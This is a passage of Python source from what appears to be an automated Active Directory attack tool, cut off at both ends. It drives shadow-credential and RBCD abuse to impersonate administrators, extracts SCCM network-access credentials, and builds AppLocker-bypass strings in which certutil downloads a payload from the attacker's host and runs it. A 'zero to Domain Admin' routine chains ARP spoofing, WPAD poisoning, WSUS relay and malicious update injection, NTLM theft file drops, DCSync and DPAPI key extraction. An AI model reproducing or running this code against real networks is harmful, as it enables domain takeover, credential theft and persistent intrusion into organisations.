            cmd += ["-pfx-pass", pfx_password]

        result = run(cmd, cfg, timeout=120)
        if ccache_path.exists():
            ok(f"PKINIT: TGT saved to {ccache_path}")
            detail(f"export KRB5CCNAME={ccache_path}")
            return True

    log.warning("PKINIT authentication failed")
    return False


def run_shadow_credentials(target: str, cfg: Config) -> bool:
    """Set shadow credentials on target and authenticate via PKINIT."""
    phase_header(f"SHADOW CREDENTIALS ({target})")

    if not cfg.has_creds:
        log.error("Shadow Credentials requires domain credentials")
        return False

    # Try pywhisker first
    pywhisker_path = find_tool(
        "pywhisker", "pywhisker.py",
        paths=[TOOLS_DIR / "pywhisker" / "pywhisker.py"]
    )

    if pywhisker_path:
        log.info(f"Setting shadow credentials on '{target}' via pywhisker...")
        shadow_output = cfg.work_dir / f"shadow-cred-{target}.txt"

        cmd = pywhisker_path.split() + [
            "-d", cfg.domain,
            "-u", cfg.username,
            "--target", target,
            "--action", "add",
            "--dc-ip", cfg.dc_ip,
        ]
        if cfg.nthash:
            cmd += ["-hashes", f":{cfg.nthash}"]
        else:
            cmd += ["-p", cfg.password]

        result = run(cmd, cfg, timeout=120, outfile=shadow_output)
        output = result.stdout or ""
        if shadow_output.exists():
            output += shadow_output.read_text()

        # Parse PFX path and password from pywhisker output
        pfx_match = re.search(r"PFX.*?(?:saved|written|path)[:\s]+(\S+\.pfx)", output, re.IGNORECASE)
        pass_match = re.search(r"PFX.*?password[:\s]+(\S+)", output, re.IGNORECASE)

        if pfx_match:
            pfx_path = pfx_match.group(1)
            pfx_password = pass_match.group(1) if pass_match else ""
            ok(f"Shadow credential set on '{target}'")
            detail(f"PFX: {pfx_path}")

            # Authenticate via PKINIT
            if _pkinit_auth(pfx_path, pfx_password, cfg):
                success_box(f"Shadow Credentials: NT hash recovered for '{target}'!")
                return True
        elif result.returncode == 0:
            log.warning("pywhisker succeeded but could not parse PFX output")
        else:
            log.warning(f"pywhisker failed: {_first_line(result.stderr or output)}")

    # Fallback: bloodyAD
    if tool_exists("bloodyAD"):
        log.info(f"Setting shadow credentials on '{target}' via bloodyAD...")
        cmd = [
            "bloodyAD", "-d", cfg.domain,
            "-u", cfg.username,
            "--host", cfg.dc_ip,
        ]
        if cfg.nthash:
            cmd += ["-p", f":{cfg.nthash}"]
        else:
            cmd += ["-p", cfg.password]
        cmd += ["add", "shadowCredentials", target]

        result = run(cmd, cfg, timeout=120)
        output = result.stdout or ""

        pfx_match = re.search(r"PFX.*?(?:saved|path)[:\s]+(\S+\.pfx)", output, re.IGNORECASE)
        pass_match = re.search(r"PFX.*?password[:\s]+(\S+)", output, re.IGNORECASE)

        if pfx_match or result.returncode == 0:
            pfx_path = pfx_match.group(1) if pfx_match else ""
            pfx_password = pass_match.group(1) if pass_match else ""
            if pfx_path:
                ok(f"Shadow credential set on '{target}' via bloodyAD")
                if _pkinit_auth(pfx_path, pfx_password, cfg):
                    success_box(f"Shadow Credentials: NT hash recovered for '{target}'!")
                    return True
            else:
                log.warning("bloodyAD succeeded but no PFX file found in output")
        else:
            log.warning(f"bloodyAD shadow credentials failed: {_first_line(output)}")

    if not pywhisker_path and not tool_exists("bloodyAD"):
        log.error("Neither pywhisker nor bloodyAD found — cannot set shadow credentials")
        detail("Install: git clone https://github.com/ShutdownRepo/pywhisker /opt/tools/pywhisker")
        detail("Or: pip install bloodyAD")

    return False


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# RBCD (Resource-Based Constrained Delegation) Abuse
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def _create_machine_account(cfg: Config) -> tuple[str, str]:
    """Create a machine account for RBCD abuse. Returns (name, password) or ('', '')."""
    if cfg.machine_account and cfg.machine_password:
        ok(f"Using pre-created machine account: {cfg.machine_account}")
        return (cfg.machine_account, cfg.machine_password)

    if not tool_exists("impacket-addcomputer"):
        log.error("impacket-addcomputer not found — cannot create machine account")
        return ("", "")

    import random
    import string
    machine_name = cfg.machine_account or f"DESKTOP-{''.join(random.choices(string.ascii_uppercase + string.digits, k=7))}$"
    machine_pass = cfg.machine_password or ''.join(
        random.choices(string.ascii_letters + string.digits + "!@#$%", k=16)
    )

    # Strip trailing $ for the command if present, impacket adds it
    machine_arg = machine_name.rstrip("$")

    log.info(f"Creating machine account '{machine_arg}$' for RBCD abuse...")
    cmd = ["impacket-addcomputer"]
    if cfg.nthash:
        cmd += [f"{cfg.domain}/{cfg.username}", "-hashes", f":{cfg.nthash}"]
    else:
        cmd += [f"{cfg.domain}/{cfg.username}:{cfg.password}"]
    cmd += [
        "-computer-name", machine_arg,
        "-computer-pass", machine_pass,
        "-dc-ip", cfg.dc_ip,
    ]

    result = run(cmd, cfg, timeout=60)
    output = (result.stdout or "") + (result.stderr or "")

    if re.search(r"successfully added|account.*created", output, re.IGNORECASE):
        ok(f"Machine account created: {machine_arg}$")
        return (f"{machine_arg}$", machine_pass)

    if re.search(r"MachineAccountQuota.*0|MAQ.*0|quota.*exceeded", output, re.IGNORECASE):
        log.error("Machine Account Quota (MAQ) is 0 — cannot create machine account")
        detail("Try: --machine-account <existing> --machine-password <pass>")
        return ("", "")

    if re.search(r"already exists", output, re.IGNORECASE):
        log.warning(f"Machine account '{machine_arg}$' already exists — trying to use it")
        return (f"{machine_arg}$", machine_pass)

    log.error(f"Failed to create machine account: {_first_line(output)}")
    return ("", "")


def _set_rbcd(target: str, machine_name: str, cfg: Config) -> bool:
    """Set msDS-AllowedToActOnBehalfOfOtherIdentity (RBCD) on the target."""
    log.info(f"Setting RBCD delegation: {machine_name} → {target}...")

    # Try bloodyAD first (most reliable)
    if tool_exists("bloodyAD"):
        cmd = [
            "bloodyAD", "-d", cfg.domain,
            "-u", cfg.username,
            "--host", cfg.dc_ip,
        ]
        if cfg.nthash:
            cmd += ["-p", f":{cfg.nthash}"]
        else:
            cmd += ["-p", cfg.password]
        cmd += ["add", "rbcd", target, machine_name]

        result = run(cmd, cfg, timeout=60)
        output = (result.stdout or "") + (result.stderr or "")
        if result.returncode == 0 or re.search(r"success|added|attribute.*set", output, re.IGNORECASE):
            ok(f"RBCD delegation set: {machine_name} can impersonate on {target}")
            return True
        log.warning(f"bloodyAD RBCD set failed: {_first_line(output)}")

    # Fallback: impacket-rbcd (if available)
    rbcd_tool = find_tool(
        "impacket-rbcd", "rbcd.py",
        paths=[TOOLS_DIR / "impacket" / "examples" / "rbcd.py"]
    )
    if rbcd_tool:
        cmd = rbcd_tool.split()
        if cfg.nthash:
            cmd += [f"{cfg.domain}/{cfg.username}", "-hashes", f":{cfg.nthash}"]
        else:
            cmd += [f"{cfg.domain}/{cfg.username}:{cfg.password}"]
        cmd += [
            "-delegate-to", target,
            "-delegate-from", machine_name,
            "-action", "write",
            "-dc-ip", cfg.dc_ip,
        ]
        result = run(cmd, cfg, timeout=60)
        if result.returncode == 0:
            ok(f"RBCD delegation set via impacket")
            return True

    log.error("Failed to set RBCD delegation (need bloodyAD or impacket-rbcd)")
    return False


def _s4u2proxy(target: str, machine_name: str, machine_pass: str,
               cfg: Config) -> Optional[str]:
    """Perform S4U2Self + S4U2Proxy to impersonate administrator. Returns ccache path."""
    if not tool_exists("impacket-getST"):
        log.error("impacket-getST not found — cannot perform S4U2Proxy")
        return None

    ccache_path = cfg.work_dir / f"rbcd-{target}.ccache"
    log.info(f"S4U2Proxy: impersonating administrator on {target}...")

    # Clean target name (remove domain suffix if present)
    target_spn = target
    if "." not in target_spn and cfg.domain:
        target_spn = f"{target}.{cfg.domain}"

    cmd = [
        "impacket-getST",
        "-spn", f"cifs/{target_spn}",
        "-impersonate", "administrator",
        f"{cfg.domain}/{machine_name}:{machine_pass}",
        "-dc-ip", cfg.dc_ip,
    ]

    result = run(cmd, cfg, timeout=120)
    output = (result.stdout or "") + (result.stderr or "")

    # getST saves ccache with a predictable name
    ccache_match = re.search(r"Saving ticket in\s+(\S+\.ccache)", output)
    if ccache_match:
        saved_ccache = Path(ccache_match.group(1))
        if saved_ccache.exists():
            import shutil as _shutil
            _shutil.copy2(str(saved_ccache), str(ccache_path))
            ok(f"S4U2Proxy: Kerberos ticket saved to {ccache_path}")
            detail(f"export KRB5CCNAME={ccache_path}")
            detail(f"impacket-psexec -k -no-pass {target_spn}")
            return str(ccache_path)

    # Check for any .ccache files created
    for f in Path(".").glob("*.ccache"):
        if f.stat().st_mtime > cfg.start_time:
            import shutil as _shutil
            _shutil.copy2(str(f), str(ccache_path))
            ok(f"S4U2Proxy: Ticket found and saved to {ccache_path}")
            return str(ccache_path)

    log.error(f"S4U2Proxy failed: {_first_line(output)}")
    return None


def run_rbcd_attack(target: str, cfg: Config) -> bool:
    """RBCD abuse: create machine account, set delegation, S4U2Proxy, impersonate admin."""
    phase_header(f"RBCD DELEGATION ABUSE ({target})")

    if not cfg.has_creds:
        log.error("RBCD abuse requires domain credentials")
        return False

    # 1. Create machine account
    machine_name, machine_pass = _create_machine_account(cfg)
    if not machine_name:
        return False

    # 2. Set RBCD delegation
    if not _set_rbcd(target, machine_name, cfg):
        return False

    # 3. S4U2Proxy to impersonate administrator
    ccache = _s4u2proxy(target, machine_name, machine_pass, cfg)
    if ccache:
        success_box(f"RBCD: Got admin ticket for {target}!")
        detail(f"Ticket: {ccache}")
        detail(f"Usage: export KRB5CCNAME={ccache}")
        detail(f"Then:  impacket-psexec -k -no-pass {target}")
        return True

    log.error("RBCD attack failed at S4U2Proxy stage")
    return False


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# SCCM NAA Credential Theft
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def detect_sccm(cfg: Config) -> str:
    """Discover SCCM Management Point."""
    if cfg.sccm_server:
        detail(f"SCCM server: {cfg.sccm_server} (user-specified)")
        return cfg.sccm_server

    sccmhunter_path = find_tool(
        "sccmhunter",
        paths=[TOOLS_DIR / "sccmhunter" / "sccmhunter.py"]
    )

    if sccmhunter_path:
        log.info("Discovering SCCM Management Points via sccmhunter...")
        find_output = cfg.work_dir / "sccm-find.txt"
        cmd = sccmhunter_path.split() + [
            "find",
            "-u", cfg.username,
            "-d", cfg.domain,
            "-dc-ip", cfg.dc_ip,
        ]
        if cfg.nthash:
            cmd += ["-hashes", f":{cfg.nthash}"]
        else:
            cmd += ["-p", cfg.password]

        result = run(cmd, cfg, timeout=120, outfile=find_output)
        output = result.stdout or ""
        if find_output.exists():
            output += find_output.read_text()

        # Parse for Management Point
        mp_match = re.search(
            r"Management\s*Point[:\s]+(\S+)",
            output, re.IGNORECASE
        )
        if mp_match:
            server = mp_match.group(1).strip()
            ok(f"SCCM Management Point found: {server}")
            cfg.sccm_server = server
            return server

        # Check for IP/hostname in output
        host_match = re.search(r"(\d+\.\d+\.\d+\.\d+).*(?:MP|SCCM|Management)", output, re.IGNORECASE)
        if host_match:
            server = host_match.group(1)
            ok(f"SCCM server found: {server}")
            cfg.sccm_server = server
            return server

    # Fallback: LDAP query via nxc for msSMSManagementPoint
    if tool_exists("nxc") and cfg.has_creds:
        log.info("Querying LDAP for SCCM Management Point attribute...")
        cmd = ["nxc", "ldap", cfg.dc_ip]
        if cfg.nthash:
            cmd += ["-u", cfg.username, "-H", cfg.nthash, "-d", cfg.domain]
        else:
            cmd += ["-u", cfg.username, "-p", cfg.password, "-d", cfg.domain]
        cmd += ["-M", "sccm"]

        result = run(cmd, cfg, timeout=60)
        output = result.stdout or ""
        mp_match = re.search(r"Management.*?Point[:\s]+(\S+)", output, re.IGNORECASE)
        if mp_match:
            server = mp_match.group(1).strip()
            ok(f"SCCM Management Point from LDAP: {server}")
            cfg.sccm_server = server
            return server

    log.warning("No SCCM Management Point discovered")
    return ""


def run_sccm_attack(cfg: Config) -> bool:
    """Extract NAA credentials from SCCM policies."""
    phase_header("SCCM NAA CREDENTIAL THEFT")

    if not cfg.has_creds:
        log.error("SCCM NAA extraction requires domain credentials")
        return False

    sccmhunter_path = find_tool(
        "sccmhunter",
        paths=[TOOLS_DIR / "sccmhunter" / "sccmhunter.py"]
    )

    if not sccmhunter_path:
        log.error("sccmhunter not found — install to /opt/tools/sccmhunter")
        detail("git clone https://github.com/garrettfoster13/sccmhunter /opt/tools/sccmhunter")
        return False

    # 1. Discover SCCM server
    sccm_server = detect_sccm(cfg)
    if not sccm_server:
        log.warning("No SCCM server found — skipping NAA extraction")
        return False

    # 2. Get site code
    log.info("Querying SCCM site information...")
    show_output = cfg.work_dir / "sccm-show.txt"
    cmd = sccmhunter_path.split() + [
        "show",
        "-u", cfg.username,
        "-d", cfg.domain,
    ]
    if cfg.nthash:
        cmd += ["-hashes", f":{cfg.nthash}"]
    else:
        cmd += ["-p", cfg.password]

    result = run(cmd, cfg, timeout=120, outfile=show_output)
    output = result.stdout or ""
    if show_output.exists():
        output += show_output.read_text()

    # Parse site code
    site_match = re.search(r"Site\s*Code[:\s]+(\S+)", output, re.IGNORECASE)
    site_code = site_match.group(1).strip() if site_match else ""

    if not site_code:
        log.warning("Could not determine SCCM site code — trying default 'SMS'")
        site_code = "SMS"

    ok(f"SCCM site code: {site_code}")

    # 3. Extract NAA credentials via HTTP API
    log.info("Requesting SCCM policies to extract NAA credentials...")
    http_output = cfg.work_dir / "sccm-http.txt"
    cmd = sccmhunter_path.split() + [
        "http",
        "-u", cfg.username,
        "-d", cfg.domain,
        "-dc-ip", cfg.dc_ip,
        "-mp", sccm_server,
        "-sc", site_code,
    ]
    if cfg.nthash:
        cmd += ["-hashes", f":{cfg.nthash}"]
    else:
        cmd += ["-p", cfg.password]

    result = run(cmd, cfg, timeout=180, outfile=http_output)
    output = result.stdout or ""
    if http_output.exists():
        output += http_output.read_text()

    # 4. Parse NAA credentials from output
    naa_creds = []

    # Look for username/password pairs
    user_matches = re.findall(
        r"(?:NAA|Network\s*Access\s*Account).*?(?:User(?:name)?|Account)[:\s]+(\S+)",
        output, re.IGNORECASE
    )
    pass_matches = re.findall(
        r"(?:NAA|Network\s*Access\s*Account).*?(?:Pass(?:word)?)[:\s]+(\S+)",
        output, re.IGNORECASE
    )

    # Also look for generic credential patterns
    if not user_matches:
        user_matches = re.findall(r"Username[:\s]+(\S+)", output, re.IGNORECASE)
        pass_matches = re.findall(r"Password[:\s]+(\S+)", output, re.IGNORECASE)

    for i, user in enumerate(user_matches):
        password = pass_matches[i] if i < len(pass_matches) else ""
        naa_creds.append((user, password))

    # 5. Save and report
    if naa_creds:
        cred_file = cfg.work_dir / "sccm-naa.txt"
        with open(cred_file, "w") as f:
            for user, password in naa_creds:
                f.write(f"Username: {user}\n")
                f.write(f"Password: {password}\n")
                f.write("---\n")

        success_box(f"SCCM NAA: {len(naa_creds)} credential(s) extracted!")
        for user, password in naa_creds:
            detail(f"  {user} : {password}")

        # 6. Set as active credentials if different from current
        for user, password in naa_creds:
            if user != cfg.username and password:
                log.info(f"Additional credential found: {user}")
                detail("Consider testing with these credentials for further access")

        return True

    log.warning("No NAA credentials found in SCCM policies")
    detail(f"Raw output saved to: {http_output}")
    return False


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# AppLocker Bypass Helpers
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def _build_applocker_cmd(cfg: Config, fallback_cmd: str = "") -> str:
    """Build a command wrapped in a LOLBin for AppLocker bypass.

    When AppLocker default rules block untrusted executables, we use
    Microsoft-signed LOLBins (mshta, certutil, regsvr32, etc.) or
    write payloads to trusted writable paths (C:\\Windows\\Tasks).
    """
    cmd = cfg.custom_cmd or fallback_cmd
    url = cfg.payload_url

    # User-specified LOLBin
    if cfg.lolbin and cfg.lolbin in LOLBINS:
        template = LOLBINS[cfg.lolbin]
        return template.format(cmd=cmd, url=url or f"http://{cfg.attacker_ip}/payload")

    # Auto-select best LOLBin based on what's available
    if url:
        # Remote payload — use certutil or regsvr32
        return (f'cmd /c certutil -urlcache -split -f {url} '
                f'C:\\Windows\\Tasks\\svc.exe & C:\\Windows\\Tasks\\svc.exe')

    if cmd:
        # Local command — wrap in mshta for execution bypass
        # mshta is the most reliable AppLocker bypass
        escaped = cmd.replace('"', '""')
        return (f'mshta vbscript:Execute("CreateObject(""Wscript.Shell"").Run '
                f'""{escaped}"", 0:close")')

    return cmd


def _get_applocker_exec_cmd(cfg: Config) -> str:
    """Build an ntlmrelayx --execute-cmd string that works under AppLocker."""
    cmd = cfg.custom_cmd
    url = cfg.payload_url

    if cfg.lolbin and cfg.lolbin in LOLBINS:
        template = LOLBINS[cfg.lolbin]
        return template.format(cmd=cmd, url=url or f"http://{cfg.attacker_ip}/payload")

    # Prioritize execution methods that bypass AppLocker:
    # 1. SOCKS + wmiexec (WMI not subject to AppLocker)
    # 2. SOCKS + smbexec (services run as SYSTEM)
    # 3. LOLBin-wrapped direct execution
    if cfg.use_socks:
        return ""  # SOCKS mode handles this differently

    if url:
        return (f'cmd /c certutil -urlcache -split -f {url} '
                f'C:\\Windows\\Tasks\\svc.exe & C:\\Windows\\Tasks\\svc.exe')

    if cmd:
        escaped = cmd.replace('"', '""')
        return (f'mshta vbscript:Execute("CreateObject(""Wscript.Shell"").Run '
                f'""{escaped}"", 0:close")')

    return ""


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# Batch Mode
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def run_batch(targets: list[str], cfg: Config) -> int:
    """Exploit all targets. Reuses proven method. Returns success count."""
    total = len(targets)
    succeeded = 0
    proven_method = ""

    log.info(f"🎯 Batch exploitation: {total} targets")
    separator()

    for i, target in enumerate(targets, 1):
        if not target:
            continue
        log.info(f"[{i}/{total}] Targeting {target}")

        if proven_method:
            log.info(f"♻️  Reusing proven method: {proven_method}")
            cfg.method = proven_method

        if exploit_target(target, cfg):
            succeeded += 1
            wm_file = cfg.work_dir / f"working-method-{target}.txt"
            if wm_file.exists():
                proven_method = wm_file.read_text().strip()
        else:
            proven_method = ""
            cfg.method = ""

    cfg.method = ""  # Reset
    ok(f"Batch complete: {succeeded}/{total} targets compromised")
    return succeeded


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# Full Auto: Zero-auth → ARP/WPAD/WSUS → Crack → Exploit → DCSync
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def run_full_auto(cfg: Config):
    """Fully automated chain: no creds needed."""
    phase_header("FULL AUTO MODE — Zero to Domain Admin")
    print(f"{C.BOLD}  🚀 Attack Plan:{C.NC}")
    detail("0️⃣   Passive sniff — detect WPAD/WSUS/PXE/LLMNR/DHCPv6 traffic")
    detail("1-3  ARP spoof → WPAD poisoning → WSUS relay → PXE theft")
    detail("4️⃣   NTLM theft file drops (.library-ms/.theme on shares)")
    detail("5️⃣   Kerberoast + AS-REP Roast (credential harvest)")
    detail("6️⃣   AD CS — ESC1-17 detection (Certihound) / ESC1-16 exploit (certipy)")
    detail("7️⃣   SCCM NAA credential theft (sccmhunter)")
    detail("8️⃣   Enumerate targets + exploit (Shadow Creds / RBCD)")
    detail("9️⃣   WSUS update injection (AppLocker bypass)")
    detail("🔟  DCSync + DPAPI backup key extraction 👑")
    print()

    # Step 0: Passive sniff to discover viable attacks
    sniff_results = passive_sniff(cfg, duration=cfg.sniff_duration)
    wpad_viable = bool(sniff_results.get("wpad_llmnr") or sniff_results.get("dhcpv6")
                       or sniff_results.get("wpad_dns") or sniff_results.get("nbtns"))
    wsus_viable = bool(sniff_results.get("wsus"))
    pxe_viable = bool(sniff_results.get("pxe") or sniff_results.get("tftp"))

    if wpad_viable:
        ok("Passive discovery: WPAD/LLMNR/DHCPv6 traffic detected — poisoning attacks enabled")
    if wsus_viable:
        ok("Passive discovery: WSUS traffic detected — relay attack enabled")
    if pxe_viable:
        ok("Passive discovery: PXE/TFTP traffic detected — boot image credential theft enabled")
    if not wpad_viable and not wsus_viable and not pxe_viable:
        log.info("No WPAD/WSUS/PXE traffic seen passively — will still attempt active attacks")

    # Collect all hosts seen in passive sniff — prioritize for ARP spoofing
    sniffed_hosts = set()
    for key in sniff_results:
        sniffed_hosts.update(sniff_results[key])
    sniffed_hosts.discard(cfg.attacker_ip)
    sniffed_hosts.discard(cfg.gateway)

    # Step 1-3: ARP capture + crack (prioritize sniffed hosts)
    got_creds = run_arp_capture(cfg, priority_hosts=sorted(sniffed_hosts) if sniffed_hosts else None)

    # Step 3b: WPAD poisoning (prioritize if passive sniff detected traffic)
    if not got_creds and not cfg.no_wpad:
        if wpad_viable:
            ok("WPAD/LLMNR traffic was detected — WPAD poisoning has high chance of success")
        log.info("Trying WPAD poisoning...")
        if run_wpad_attack(cfg):
            try_crack_hashes(cfg)
            got_creds = cfg.has_creds

    # Step 4: WSUS relay (machine account capture)
    if not cfg.no_wsus:
        wsus_server = detect_wsus_server(cfg)
        if not wsus_server and wsus_viable:
            # Passive sniff saw WSUS traffic — extract the WSUS server IP from sniff results
            wsus_clients = sniff_results.get("wsus", [])
            log.info(f"Passive sniff detected WSUS clients: {wsus_clients}")
        if wsus_server:
            log.info(f"WSUS server found at {wsus_server} — attempting relay...")
            run_wsus_relay(cfg)
            try_crack_hashes(cfg)
            if not got_creds:
                got_creds = cfg.has_creds

    # Step 4b: PXE boot image credential theft (zero-auth via TFTP)
    if not got_creds and (pxe_viable or not (wpad_viable or wsus_viable)):
        log.info("Attempting PXE boot image credential extraction...")
        if run_pxe_attack(cfg):
            got_creds = cfg.has_creds

    # Step 4c: NTLM theft file drops (passive hash capture in background)
    if not cfg.no_ntlm_theft:
        log.info("Dropping NTLM theft files on writable shares (background capture)...")
        run_ntlm_theft(cfg)
        extract_hashes(cfg)
        if not got_creds:
            creds = try_crack_hashes(cfg)
            if creds:
                cfg.username, cfg.password, cfg.domain = creds
                got_creds = True

    if not got_creds:
        fail_box("Failed to capture/crack credentials via ARP/WPAD/WSUS/PXE/NTLM-theft")
        log.warning(f"Captured hashes (if any): {cfg.work_dir / 'captured-ntlmv2.txt'}")
        log.warning(f"Crack manually: hashcat -m 5600 {cfg.work_dir}/captured-ntlmv2.txt rockyou.txt")
        return

    separator()
    ok(f"🔑 Switching to authenticated attack chain")
    ok(f"Credentials: {cfg.domain}\\{cfg.username}")
    print()

    # Re-discover domain/DC now that we have creds
    if not cfg.domain:
        discovery = AutoDiscovery(cfg)
        discovery._detect_domain()
    if not cfg.dc_ip and cfg.domain:
        discovery = AutoDiscovery(cfg)
        discovery._detect_dc_ip()
    if not cfg.dc_fqdn and cfg.dc_ip:
        discovery = AutoDiscovery(cfg)
        discovery._detect_dc_fqdn()

    if not cfg.domain or not cfg.dc_ip or not cfg.dc_fqdn:
        log.error("Could not auto-detect domain/DC info after credential capture")
        log.warning(f"Re-run: {sys.argv[0]} -u '{cfg.username}' -p '{cfg.password}' -d DOMAIN --dc-ip IP")
        return

    # Step 5: Kerberoast + AS-REP Roast (immediate credential harvest)
    if not cfg.no_roast:
        log.info("Running Kerberoast + AS-REP Roast for additional credentials...")
        run_roast_attack(cfg)

    # Step 6: AD CS enum + exploitation (ESC1-ESC17 detect / ESC1-ESC16 exploit)
    if not cfg.no_adcs and tool_exists("certipy"):
        log.info("Enumerating AD CS for vulnerable certificate templates...")
        if run_adcs_attack(cfg):
            ok("AD CS exploitation succeeded — may have DA-equivalent credentials")

    # Step 7: SCCM NAA credential theft
    if not cfg.no_sccm:
        log.info("Attempting SCCM NAA credential theft...")
        run_sccm_attack(cfg)

    # Step 8: Enumerate + exploit
    relay_targets, _ = enumerate_targets(cfg)

    best_target = ""
    hv_file = cfg.work_dir / "high-value-targets.txt"
    if hv_file.exists():
        best_target = _first_line(hv_file.read_text())
    if best_target:
        ok(f"🎯 Auto-selected HIGH VALUE target: {best_target}")
    elif relay_targets:
        best_target = relay_targets[0]
        ok(f"Auto-selected target: {best_target}")

    if best_target:
        exploit_target(best_target, cfg)

    # Step 8b: WebDAV coercion — bypass SMB signing via HTTP relay
    if not best_target or not relay_targets:
        webclient_hosts = detect_webclient_hosts(cfg)
        for wh in webclient_hosts:
            if run_webdav_coercion(wh, cfg):
                break

    # Step 8c: DHCP coercion
    run_dhcp_coercion(cfg)

    # Step 8d: GPO abuse
    run_gpo_abuse(cfg)

    # Step 9: WSUS (authenticated phase)
    if not cfg.no_wsus and cfg.wsus_server:
        # Now that we have creds, try HTTPS relay with auto-cert if initial HTTP relay failed
        if cfg.wsus_https and not cfg.wsus_certfile and tool_exists("certipy"):
            log.info("Retrying WSUS HTTPS relay with certipy certificate abuse...")
            run_wsus_relay(cfg)
        # Inject malicious update (AppLocker bypass with signed delivery)
        log.info("Attempting WSUS update injection for persistence/AppLocker bypass...")
        run_wsus_inject(cfg)

    # Step 10: DCSync
    if not cfg.no_dcsync:
        dcsync_attack(best_target or cfg.dc_ip, cfg)

    # Step 10b: DPAPI backup key extraction (post-DCSync goldmine)
    if not cfg.no_dpapi:
        run_dpapi_backup(cfg)


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# Summary
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def print_summary(cfg: Config):
    elapsed = int(time.time() - cfg.start_time)
    mins, secs = divmod(elapsed, 60)

    print(f"\n{C.BOLD_CYAN}╔══════════════════════════════════════════════════════╗")
    print(f"║           📊 ATTACK CHAIN SUMMARY                   ║")
    print(f"╠══════════════════════════════════════════════════════╣{C.NC}")

    rows = [
        ("🌐", "Domain:", cfg.domain or "N/A"),
        ("🖥️ ", "DC:", f"{cfg.dc_fqdn or 'N/A'} ({cfg.dc_ip or 'N/A'})"),
        ("🎯", "Attacker:", f"{cfg.attacker_ip} ({cfg.iface})"),
        ("📡", "Target net:", cfg.target_net or cfg.specific_target or "N/A"),
    ]
    if cfg.username:
        auth_type = "PTH" if cfg.nthash else ("cracked via ARP" if not cfg.password else "password")
        rows.append(("🔑", "Auth:", f"{cfg.domain}\\{cfg.username} ({auth_type})"))

    for emoji, label, value in rows:
        print(f"{C.CYAN}║{C.NC} {emoji} {label:<18} {C.WHITE}{value:<32}{C.NC} {C.CYAN}║{C.NC}")

    print(f"{C.CYAN}╠══════════════════════════════════════════════════════╣{C.NC}")

    # Stats
    stats = []
    for name, file_pat, color in [
        ("📍 Live hosts:", "live-hosts.txt", C.WHITE),
        ("🔓 Relay targets:", "relay-targets.txt", C.WHITE),
        ("🎣 NTLMv2 hashes:", "captured-ntlmv2.txt", C.WHITE),
    ]:
        f = cfg.work_dir / file_pat
        if f.exists():
            count = len([l for l in f.read_text().splitlines() if l.strip()])
            stats.append((name, f"{color}{count}{C.NC}"))

    # WPAD/WSUS results
    for label, pattern in [
        ("🌐 WPAD captures:", "wpad-relay.txt"),
        ("📦 WSUS captures:", "wsus-relay.txt"),
    ]:
        f = cfg.work_dir / pattern
        if f.exists():
            content = f.read_text()
            auth_count = len(re.findall(r"authenticated|SUCCEED", content, re.IGNORECASE))
            if auth_count:
                stats.append((label, f"{C.BOLD_GREEN}{auth_count} auth(s){C.NC}"))

    wsus_inj = cfg.work_dir / "wsus-inject.txt"
    if wsus_inj.exists() and "inject" in wsus_inj.read_text().lower():
        stats.append(("📦 WSUS inject:", f"{C.BOLD_YELLOW}update pushed{C.NC}"))

    pxe_creds = cfg.work_dir / "pxe-creds.txt"
    if pxe_creds.exists() and pxe_creds.stat().st_size > 0:
        cred_count = pxe_creds.read_text().count("[")
        stats.append(("🖥️  PXE creds:", f"{C.BOLD_GREEN}{cred_count} credential(s){C.NC}"))

    # AD CS results
    adcs_certs = list(cfg.work_dir.glob("adcs-*.pfx"))
    if adcs_certs:
        stats.append(("📜 AD CS certs:", f"{C.BOLD_GREEN}{len(adcs_certs)} certificate(s){C.NC}"))
    adcs_enum = cfg.work_dir / "adcs-enum.txt"
    if adcs_enum.exists():
        vuln_count = len(re.findall(r"ESC\d+", adcs_enum.read_text()))
        if vuln_count:
            stats.append(("🔓 AD CS vulns:", f"{C.BOLD_YELLOW}{vuln_count} ESC finding(s){C.NC}"))

    # Kerberoast / AS-REP results
    for label, pattern in [
        ("🔥 Kerberoast:", "kerberoast-cracked.txt"),
        ("🔥 AS-REP:", "asrep-cracked.txt"),
    ]:
        f = cfg.work_dir / pattern
        if f.exists() and f.stat().st_size > 0:
            count = len(f.read_text().strip().splitlines())
            stats.append((label, f"{C.BOLD_GREEN}{count} cracked{C.NC}"))
    roast_hashes = cfg.work_dir / "kerberoast-hashes.txt"
    if roast_hashes.exists():
        count = len(roast_hashes.read_text().strip().splitlines())
        if count:
            stats.append(("🎫 SPN hashes:", f"{C.WHITE}{count}{C.NC}"))

    # NTLM theft drops
    theft_drops = cfg.work_dir / "ntlm-theft-drops.txt"
    if theft_drops.exists():
        count = len(theft_drops.read_text().strip().splitlines())
        if count:
            stats.append(("📂 Theft drops:", f"{C.WHITE}{count} file(s) placed{C.NC}"))
